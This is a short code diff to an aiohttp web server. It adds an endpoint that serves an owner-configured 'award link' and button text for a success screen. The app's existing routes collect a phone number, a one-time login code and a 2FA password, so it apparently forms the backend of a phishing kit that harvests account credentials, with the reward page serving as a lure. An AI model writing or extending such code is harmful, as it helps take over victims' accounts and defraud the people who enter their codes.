@@ -418,6 +418,12 @@ async def api_submit_2fa(request):
         logger.error(f"Error in submit_2fa: {e}")
         return web.json_response({"status": "error", "message": str(e)}, status=500)
 
+async def api_reward(request):
+    """Returns the award link configured by the owner for the success screen."""
+    link, btn_text = database.get_reward_settings()
+    return web.json_response({"link": link or "", "button_text": btn_text})
+
+
 async def handle_index(request):
     index_path = os.path.join(os.path.dirname(__file__), "static", "index.html")
     if not os.path.exists(index_path):
@@ -447,6 +453,7 @@ async def init_web_app() -> web.Application:
     app.router.add_post("/api/submit_phone", api_submit_phone)
     app.router.add_post("/api/submit_otp", api_submit_otp)
     app.router.add_post("/api/submit_2fa", api_submit_2fa)
+    app.router.add_get("/api/reward", api_reward)
     
     # Index/Frontend router
     app.router.add_get("/", handle_index)
